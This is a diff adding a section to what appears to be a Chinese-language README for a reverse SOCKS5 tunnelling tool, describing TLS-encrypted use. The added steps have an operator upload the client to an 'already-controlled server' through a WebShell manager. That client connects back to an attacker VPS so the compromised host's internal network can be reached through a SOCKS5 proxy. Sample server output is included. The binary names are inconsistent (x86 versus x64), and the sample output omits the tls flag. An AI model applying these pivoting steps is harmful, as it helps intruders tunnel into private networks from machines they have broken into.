@@ -53,6 +53,27 @@ Socks5 new socket from :  11.11.11.11:55943
 Control new socket from :  11.11.11.11:55789
 ```
 
+## 内网socks5代理(TLS加密)
+* 将```server_linux_x64```上传到VPS服务器(假设VPS的IP地址10.10.10.10)
+* 将server.pem(tls公钥),server.key(tls私钥)上传到```server_linux_x64```相同目录
+* 通过 ```.\server_linux_x64 socks5 80 1080 tls```在80端口启动控制监听,1080启动内网socks5端口
+* 服务端打印如下信息表示监听成功
+```
+root@vultr:~# ./server_linux_x64 socks5 80 1080
+Control Listening:  80
+Socks5 Listening:  1080
+```
+* 通过WEBShell管理工具将```client_win_x86.exe```上传到已控服务器
+* 运行```client_win_x64.exe socks5 10.10.10.10 80 tls```连接服务端
+* 使用10.10.10.10:1080作为内网是socks5代理(11.11.11.11是该内网出口路由器的IP地址)
+```
+root@vultr:~# ./server_linux_x64 socks5 80 1080
+Control Listening:  80
+Socks5 Listening:  1080
+Socks5 new socket from :  11.11.11.11:55943
+Control new socket from :  11.11.11.11:55789
+```
+
 # 已测试
 ## server
 * ubuntu 18
